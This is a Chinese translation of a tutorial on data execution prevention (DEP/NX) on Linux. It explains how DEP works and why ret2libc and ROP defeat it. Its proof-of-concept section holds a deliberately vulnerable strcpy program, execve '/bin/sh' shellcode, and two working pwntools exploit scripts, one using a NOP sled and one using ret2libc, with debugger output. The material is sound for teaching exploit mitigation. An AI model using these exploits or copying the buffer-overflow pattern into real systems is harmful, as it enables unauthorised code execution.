> 原文链接: https://www.anquanke.com//post/id/91266 


# 利用缓解技术：数据执行保护（DEP）


                                阅读量   
                                **133621**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者ricksanchez，文章来源：0x00sec.org
                                <br>原文地址：[https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/dm/1024_673_/t01bc0b263ab585969f.jpg)](https://p5.ssl.qhimg.com/dm/1024_673_/t01bc0b263ab585969f.jpg)



## 一、前言

欢迎阅读GNU/Linux利用缓解技术的系列文章。前面我们一直在介绍pwn以及漏洞利用技术相关知识，现在我想把重点转移到绕过技术上，通过一系列文章介绍当前常见的防御机制。随后，我将重点介绍这些技术的局限性，通过一个简单示例展示相应的绕过方法。

> 备注：本文是我近期自学的一些心得，可能包含错误内容。如果你们发现任何纰漏，请及时告知我。

这是本系列的第一篇文章，会对整体概念做个简单的介绍。后续的文章（特别是介绍利用缓解技术时）将关注可以使用的防御机制及绕过技术。

BTW，特别感谢<a>@_py</a>的试读及校对。

阅读本文时，希望大家能满足以下要求：
- 有足够空闲的时间；
- 对内存破坏相关知识有一定的了解；
- 有独立探寻未知领域的个人意愿；
- 在PoC环节中，掌握必备的ASM/C语言知识。


## 二、简介

从漏洞利用技术首次出现开始，在过去的二十年里，漏洞利用方法的总量一直在持续上涨。虽然软件研发领域中不断采用新的安全保护层，但即便如此，公开漏洞利用技术的数量仍在持续上升。相比十年前，现在如果系统被攻破或者被攻击者接管，可能会带来更加严重的后果。基于这一点，攻击者更加青睐利用[web应用](https://courses.cs.washington.edu/courses/cse484/14au/reading/25-years-vulnerabilities.pdf)中的漏洞，以获得任意代码执行。尽管如此，我们也不能忽视系统本身的漏洞，因为已经存在相应的[漏洞利用](https://www.exploit-db.com/exploit-database-statistics/)技术。

近年来，已经出现了一系列令人印象深刻的系统漏洞攻击事件，近期的一个最严重的案例为：[Equifax公司](https://www.wired.com/story/equifax-breach-no-excuse/)超过1.4亿客户的数据发生泄漏，数据内容包括个人信息、地址以及非常重要的社保号码（SSN）（可以参考相关的[CVE细节](https://www.cvedetails.com/cve/cve-2017-9805)）。

索尼公司也发生了类似的事件，未公开的[电影素材](https://www.sans.org/reading-room/whitepapers/casestudies/case-study-critical-controls-sony-implemented-36022)和[PlayStation网站的用户数据](https://venturebeat.com/2011/09/22/security-lessons-from-the-playstation-network-breach/)遭到泄漏，暴漏了用户姓名、住址、email地址、出生日期、用户名、密码、安全问题，甚至是信用卡等一系列信息。

最近发生的另一起安全事件为[BlueBorne](https://www.trendmicro.com/vinfo/gb/security/news/internet-of-things/blueborne-bluetooth-vulnerabilities-expose-billions-of-devices-to-hacking)，其危害范围非常庞大，影响80多亿个蓝牙设备。主要原因是由于蓝牙协议中存在缺陷，攻击者可以通过无线方式触发漏洞，实现信息泄露或者远程代码执行。

我们需要加固应用程序和系统内部组件来控制这类安全风险，以阻止后续的攻击事件。所有的主流操作系统和大型软件供应商都已采用了相应的防御机制。然而，这些机制在实现过程中并不完备，可能因为某些原因有所缩水，这也是漏洞利用技术得以继续生存的原因所在。



## 三、数据执行保护（DEP）

### <a class="reference-link" name="3.1%20%E5%9F%BA%E6%9C%AC%E8%AE%BE%E8%AE%A1"></a>3.1 基本设计

类型不安全（type unsafe）语言目前的普及度非常高，这些语言在给予程序员完全自由管理内存的同时，也会带来内存破坏问题。修复这些问题通常情况下并不是一件麻烦事，大家已经见惯不怪。然而，由于许多单位（特别是大型公司）所运行的许多系统仍在使用未打补丁的遗留代码，因此这些问题现在仍然是真实存在的安全威胁，滥用这些问题时可能会造成严重后果。比如，虽然Windows 7的主流支持已经于2015年结束，但2017年该系统的[市场份额](http://gs.statcounter.com/os-version-market-share/windows/desktop/worldwide)依然保持在50%左右，这就是非常典型的一个案例。与此同时，2017年Windows 8以及Windows 10加在一起的市场总额才勉强超过40%。这些统计信息每个月都会更新，大家可以在[CVE DB](https://www.cvedetails.com/browse-by-date.php)中查找相应信息。

[数据执行保护（data execution prevention，DEP）](http://h10032.www1.hp.com/ctg/Manual/c00387685.pdf)的目标正是阻止攻击者使用受损的这些内存。现在DEP主要为基于硬件的保护形式，硬件DEP可以阻止从内存数据页（data page）中以任何形式执行代码，因此可以阻止基于缓冲区的攻击技术，这种攻击技术会将恶意代码注入内存结构中。硬件DEP的具体原理是，如果内存页所包含的内容为数据，则将其标记为不可执行区域，如果内容为代码，则标记为可执行区域。当处理器试图从标记为不可执行区域的页面中执行代码时，则会抛出访问冲突（access violation）异常，随后控制权会交给操作系统，以便处理该异常，最终结果就是应用程序被强制终止。除了硬件DEP以外，还可以使用软件安全检查来补充该功能，这样可以更好地实现异常处理过程。

总而言之，这种技术可以防止攻击者使用新注入应用程序内存中的恶意代码。即使恶意代码之前已经完成注入，这些代码也无法再次执行，这一点我们稍后会介绍。

2004年，[PAX项目](https://pax.grsecurity.net/docs/pax.txt)首先在基于Linux的系统上实现了DEP，最早的系统内核版本为[2.6.7](https://lwn.net/Articles/87808/)。当时，该方法使用了AMD处理器中的NX（No eXecute）位以及32/64位架构Intel处理器上的XD（Execute Disable）位。与此同时，2004年时，Windows XP Service Pack 2中也引入了这一功能。

## 3.2 不足之处

这里我会直接介绍数据执行保护的一些缺陷。DEP可以成功防护基本的[返回至libc（ret2libc）](http://ieeexplore.ieee.org/document/1324594/)、[返回导向编程技术（return oriented programming，ROP）](http://ieeexplore.ieee.org/abstract/document/6375725/)以及其他可以返回至已知代码的攻击技术并没有纳入考虑范围内。人们通常将这些攻击技术归为[arc injection](http://ieeexplore.ieee.org/document/1324594/)范畴，这些技术在最近使用的绕过技术中占了很大一部分比例。这些技术专为绕过DEP而研发，可以使用应用程序中已经存在的代码，这些代码的内存页被标记为可执行区域。

ret2libc使用的是glibc系统库中的函数及代码，几乎每个程序都会链接这个库，该库提供了许多可以使用的函数。

另一方面，ROP倾向于从机器码指令中寻找当前可用的代码片段，将这些片段链接在一起，形成可用的指令代码（gadget）。一段gadget由几个机器码指令组成，并且总是以return语句结束，以便程序在执行下一个gadget前将执行流程返回到被滥用的那个应用程序。一段gadget只负责一个功能，将这些gadget串联起来，形成gadget链后，就可以形成完整的利用技术。

> 注意：已经有一些案例表明，实际场景中不一定需要使用返回语句，可以使用类似于“蹦床”之类的一系列函数来转移程序控制流程。



## 四、PoC

为了进一步补充上文内容，这一部分我们将举一些具体的例子，希望能借此让大家理解DEP/NX的重要性。

### <a class="reference-link" name="4.1%20%E6%BB%A5%E7%94%A8%E7%A6%81%E7%94%A8DEP/NX%E7%9A%84%E7%A8%8B%E5%BA%8F"></a>4.1 滥用禁用DEP/NX的程序

首先我们来分析一个没有经过任何加固处理的程序。

我们可以先使用C语言编写存在漏洞的一个简单程序。

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;


char totally_secure(char *arg2[])
`{`
    char buffer[256];
    printf("What is your name?n");
    strcpy(buffer, arg2[1]);
    printf("Hello: %s!n", buffer);
`}`


int main(int argc, char *argv[])
`{`
 setvbuf(stdin, 0, 2, 0);
 setvbuf(stdout, 0, 2, 0);
 printf("Hello, I'm your friendly &amp; totally secure binary :)!n");
 totally_secure(argv);
 return 0;
`}`
```

这段代码中，`totally_secure()`函数存在缓冲区溢出漏洞。

#### <a class="reference-link" name="4.1.1%20%E7%BC%96%E8%AF%91%E5%B9%B6%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"></a>4.1.1 编译并分析程序

```
$ gcc vuln.c -o vuln_no_prots -fno-stack-protector -no-pie -Wl,-z,norelro -m32 -z execstack
$ echo 0 &gt; /proc/sys/kernel/randomize_va_space
```

首先使用GDB来分析生成的程序。

```
pwndbg&gt; checksec
[*] '/home/pwnbox/DEP/binary/vuln_no_prots'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

pwndbg&gt;
```

如上所述，生成的这个程序中没有包含任何利用缓解技术，也不存在ASLR机制。

这个程序只是用来介绍这种技术的相关原理，后面我们会介绍缓解这种技术的一些方法。

#### <a class="reference-link" name="4.1.2%20%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"></a>4.1.2 利用方法

我们可以往缓冲区中填充如下内容，引发最基本的缓冲区溢出：

```
pwndbg&gt; c
Continuing.
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────]
*EAX  0x119
 EBX  0x8049838 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804974c (_DYNAMIC) ◂— 1
*ECX  0xffffccd0 ◂— 0x41414141 ('AAAA')
*EDX  0xf7fae870 (_IO_stdfile_1_lock) ◂— 0
 EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x5d /* 0x1b5db0 */
 ESI  0xffffce20 ◂— 0x2
*EBP  0x41414141 ('AAAA')
*ESP  0xffffcde0 —▸ 0xffffce00 ◂— 0x0
*EIP  0x42424242 ('BBBB')
[───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────]
Invalid address 0x42424242
```

从结果中可知，我们已经成功覆盖了EIP以及EBP寄存器。

[ret](http://c9x.me/x86/html/file_module_x86_id_280.html)指令会从栈中取出下一个值（即我们的“BBBB”），将其载入EIP寄存器，接下来代码执行流程会继续从那里开始执行。

因此，我们可以使用诸如“`/bin/sh + 其他填充数据`”之类的数据来填充缓冲区，或者使用shellcode来尝试溢出这个位置。

我们可以自己制作shellcode，或者从[此处](http://shell-storm.org/shellcode/)获取别人做好的shellcode。

最后我使用的是如下数据：

```
46字节: x31xc0xb0x46x31xdbx31xc9xcdx80xebx16x5bx31xc0x88x43x07x89x5bx08x89x43x0cxb0x0bx8dx4bx08x8dx53x0cxcdx80xe8xe5xffxffxffx2fx62x69x6ex2fx73x68
```

利用代码如下所示：

```
#!/usr/bin/env python

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/vuln_no_prots')


def main():
    parser = argparse.ArgumentParser(description="pwnerator")
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

executable = './binary/vuln_no_prots'
payload = 'x90'*222

# shellcode 46 bytes
# 268 bytes - 46 bytes = length of nop sled
payload += 'x31xc0xb0x46x31xdbx31xc9xcdx80xebx16x5bx31xc0x88x43x07x89x5bx08x89x43x0cxb0x0b'
payload += 'x8dx4bx08x8dx53x0cxcdx80xe8xe5xffxffxffx2fx62x69x6ex2fx73x68'

payload += 'x20xcdxffxff' # stack


if args.dbg:
    r = gdb.debug([executable, payload], gdbscript="""
            b *main
            continue""",
            )
else:
    r = process([executable, payload])
    r.interactive()

if __name__ == '__main__':
    main()
    sys.exit(0)
```

执行结果如下：

```
pwnbox@lab:~/DEP$ python bypass_no_prot.py INFO
[*] '/home/pwnbox/DEP/binary/vuln_no_prots'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process './binary/vuln_no_prots': pid 65330
[*] Switching to interactive mode
Hello, I'm your friendly &amp; totally secure binary :)!
What is your name?
Hello: x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x901��F1�1��x80�[1��Cx07x89x89Cx0cxb0x0bx8dx8dSx0c̀���xffxff/bin/sh ��xff!
$ whoami
pwnbox
$

```

我们成功从栈上继续执行代码。我们跳过了一大段NOP区域，使我们的shellcode能被正确弹出。目前为止我们成功实现了代码执行，一切顺利。

### <a class="reference-link" name="4.2%20%E7%BB%95%E8%BF%87DEP/NX"></a>4.2 绕过DEP/NX

目前为止，我们介绍的内容还是跟其他简单的缓冲区溢出教程类似。从现在起，我们来看看更加有趣的一些地方。

我们需要为这个程序构造新的利用程序，这一次有DEP/NX保护机制存在。

前面那段利用代码再也无法正常工作，如下所示。

新程序的配置信息如下：

```
gcc vuln.c -o vuln_with_nx -fno-stack-protector -no-pie -Wl,-z,norelro -m32

gdb ./vuln_with_nx

pwndbg&gt; checksec
[*] '/home/pwnbox/DEP/binary/vuln_with_nx'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

pwndbg&gt;
```

执行之前的载荷后，我们可以看到如下结果：

```
python bypass_no_prot.py INFO
[+] Starting local process './binary/vuln_with_nx': pid 65946
[*] Switching to interactive mode
Hello, I'm your friendly &amp; totally secure binary :)!
What is your name?
Hello: x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x901��F1�1��x80�[1��Cx07x89x89Cx0cxb0x0bx8dx8dSx0c̀���xffxff/bin/sh ��xff!
[*] Got EOF while reading in interactive
$ whoami
[*] Process './binary/vuln_with_nx' stopped with exit code -11 (SIGSEGV) (pid 65946)
[*] Got EOF while sending in interactive

```

通过GDB可以观察到某些地方出了问题：

```
pwndbg&gt;
0xffffcd20 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────]
 EAX  0x119
 EBX  0x69622fff
 ECX  0xffffa7d0 ◂— 0x6c6c6548 ('Hell')
 EDX  0xf7fae870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b5db0
 ESI  0xffffce50 ◂— 0x2
 EBP  0x68732f6e ('n/sh')
*ESP  0xffffce10 —▸ 0xffffce00 ◂— 0xffffe5e8
*EIP  0xffffcd20 ◂— 0x90909090
[───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────]
   0x804851e  &lt;totally_secure+88&gt;    add    esp, 0x10
   0x8048521  &lt;totally_secure+91&gt;    nop    
   0x8048522  &lt;totally_secure+92&gt;    mov    ebx, dword ptr [ebp - 4]
   0x8048525  &lt;totally_secure+95&gt;    leave  
   0x8048526  &lt;totally_secure+96&gt;    ret    
    ↓
 ► 0xffffcd20                        nop    
   0xffffcd21                        nop    
   0xffffcd22                        nop    
   0xffffcd23                        nop    
   0xffffcd24                        nop    
   0xffffcd25                        nop    
[───────────────────────────────────────────────────────────────────STACK────────────────────────────────────────────────────────────────────]
00:0000│ esp  0xffffce10 —▸ 0xffffce00 ◂— 0xffffe5e8
01:0004│      0xffffce14 ◂— 0x0
02:0008│      0xffffce18 ◂— 0x2
03:000c│      0xffffce1c ◂— 0x0
04:0010│      0xffffce20 ◂— 0x2
05:0014│      0xffffce24 —▸ 0xffffcee4 —▸ 0xffffd0c2 ◂— 0x69622f2e ('./bi')
06:0018│      0xffffce28 —▸ 0xffffcef0 —▸ 0xffffd1e9 ◂— 0x4e5f434c ('LC_N')
07:001c│      0xffffce2c —▸ 0xffffce50 ◂— 0x2
[─────────────────────────────────────────────────────────────────BACKTRACE──────────────────────────────────────────────────────────────────]
 ► f 0 ffffcd20
pwndbg&gt;
```

我们再次命中了NOP区域，因此我们的位置没有问题。然而，这些内存页不再被执行，最终我们看到了非常讨厌的SEGSEGV错误。

是时候使用arc injection技术了。

#### <a class="reference-link" name="4.2.1%20ret2libc"></a>4.2.1 ret2libc

让我们先从ret2libc开始。

这里我不会详细介绍这个技术，因为介绍该技术的文章侧重于防御方面内容。此外，我们可以找到许多难题挑战及利用技术相关文章，如 [ret2libc](https://0x00sec.org/t/exploiting-techniques-000-ret2libc/)文章。

因此，我减少了这部分内容，避免冗余或重复信息存在。

> 注意：这里我们仍然没有面对ASLR，因此不需要使用高级的ret2libc技术，这里介绍的方法仅用于演示目的。

基本的ret2libc方法如下：

|栈顶|EBP|EIP|伪造的返回地址|shell的地址
|------
|AAAAAAAAAA|AAAA|系统函数 (libc)的地址|比如JUNK（垃圾）数据|比如 /bin/sh

**首先是查找libc基地址：**

1、可以使用如下方法查找已链接的libc：

```
ldd vuln_with_nx
    linux-gate.so.1 =&gt;  (0xf7ffc000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e1d000)         # &lt;- this is it
    /lib/ld-linux.so.2 (0x56555000)
```

2、使用gdb查找libc的基地址：

```
pwndbg&gt; vmmap libc
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0xf7df7000 0xf7fab000 r-xp   1b4000 0      /lib/i386-linux-gnu/libc-2.24.so     # we want this one
0xf7fab000 0xf7fad000 r--p     2000 1b3000 /lib/i386-linux-gnu/libc-2.24.so
0xf7fad000 0xf7fae000 rw-p     1000 1b5000 /lib/i386-linux-gnu/libc-2.24.so
pwndbg&gt;
```

**其次，查找`/bin/sh`偏移量：**

现在我们需要查找`/bin/sh`在其中的偏移量。

```
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "bin/sh"
    15fa0f /bin/sh                    # &lt;- this is our offset
```

现在我们可以通过`基地址+偏移量`的方式计算出shell的地址。具体算式为：`0xf7df7000` + `15fa0f` = `0xf7f56a0f`。

**然后，查找system位置：**

```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
    246: 00116670    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
    628: 0003b060    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
    1461: 0003b060    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0        # this is our gem
```

现在我们可以通过`基地址+偏移量`的方式计算出shell的地址。具体算式为：`0xf7df7000` + `0x3b060` = `0xf7e32060`。

从现在开始，我们可以构造最终可用的利用代码了，我们已经得到所需的所有信息。

或者我们也可以使用下面这种方法，即**没有ASLR时的偷懒方法**。

首先打印system的位置：

```
pwndbg&gt; print system
$1 = `{`&lt;text variable, no debug info&gt;`}` 0xf7e32060 &lt;system&gt;
```

搜索可用的shell：

```
pwndbg&gt; find &amp;system, +99999999,  "/bin/sh"
0xf7f56a0f
warning: Unable to access 16000 bytes of target memory at 0xf7fb8733, halting search.
1 pattern found.
pwndbg&gt;
```

这样可以直接得到构造利用代码所需的那些地址。

**最终利用代码如下：**

```
#!/usr/bin/env python

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = '32'
context.log_level = 'DEBUG'

binary = ELF('./binary/vuln_with_nx')
libc = ELF('/lib/i386-linux-gnu/libc-2.24.so')


def main():
    parser = argparse.ArgumentParser(description='pwnage')
    parser.add_argument('--dbg', '-d', action='store_true')
    args = parser.parse_args()

    executable = './binary/vuln_with_nx'

    libc_base = 0xf7df7000

    binsh = int(libc.search("/bin/sh").next())
    print("[+] Shell located at offset from libc: %s" % hex(binsh))
    shell_addr = libc_base + binsh
    print("[+] Shell is at address: %s" % hex(shell_addr))
    print("[+] libc.system() has a %s offset from libc" % hex(libc.symbols["system"]))
    system_call = int(libc_base + libc.symbols["system"])
    print("[+] system call is at address: %s" % hex(system_call))

    payload = 'A' * 268
    payload += p32(system_call)
    payload += 'JUNK'
    payload += p32(shell_addr)

    if args.dbg:
        r = gdb.debug([executable, payload],
                        gdbscript="""
                        b *totally_secure+53
                        continue""")
    else:
        r = process([executable, payload])
    r.interactive()

if __name__ == '__main__':
    main()
    sys.exit(0)
```

执行结果为：

```
python bypass_ret2libc.py INFO
[*] '/DEP/binary/vuln_with_nx'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.24.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Shell located at offset from libc: 0x15fa0f
[+] Shell is at address: 0xf7f56a0f
[+] libc.system() has a 0x3b060 offset from libc
[+] system call is at address: 0xf7e32060
[+] Starting local process './binary/vuln_with_nx': pid 65828
[*] Switching to interactive mode
Hello, I'm your friendly &amp; totally secure binary :)!
What is your name?
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` ��JUNKx0fj��!
$ whoami
pwnbox
$

```

从结果中可知，我们使用这段利用代码在最新的Ubuntu系统上成功绕过了DEP/NX保护机制。

大家也可以自己动手试一下。

> 注意：这种方法需要依赖实际环境中的libc库才能正常工作。

#### <a class="reference-link" name="4.2.2%20ROP"></a>4.2.2 ROP

最开始时，人们使用类似ret2libc等返回到已知代码的攻击方法来绕过系统上的DEP/NX机制。一般情况下，所有的arc injection攻击方法都可以绕过DEP/NX，而ROP可以作为ret2libc的替代方案或者增强版。因此，这种情况下也可以使用ROP技术。我们会在后续文章中介绍ROP相关知识。



## 五、总结

这篇文章并不长，大概介绍了DEP/NX保护机制的特点及脆弱性。可以认为，系统引入这种防御机制的目的是为了阻止现在最为常用的一种漏洞利用技术。刚开始时这种方法非常有效，但随后出现了arc injection方法，可以绕过这种保护机制。

希望这系列文章能给大家带来帮助，如果大家有什么意见或者建议，欢迎及时反馈，我会在后续文章中满足大家需求。
